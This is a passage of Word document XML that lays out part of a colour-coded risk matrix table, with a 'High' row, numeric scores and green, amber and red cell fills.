            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="210"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:vMerge w:val="restart"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Cambria"/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>"#$</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:right="63"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="40"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>27*</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:right="3"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="210" w:lineRule="exact"/>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="192"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:vMerge/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFCC"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="192" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Cambria"/>
                <w:color w:val="FFFFFF"/>
                <w:w w:val="72"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>!%&amp;'(#)*)&amp;'+!,!</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="960" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="192" w:lineRule="exact"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Cambria"/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>-./0!.-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2280" w:type="dxa"/>
            <w:gridSpan w:val="8"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:spacing w:line="192" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
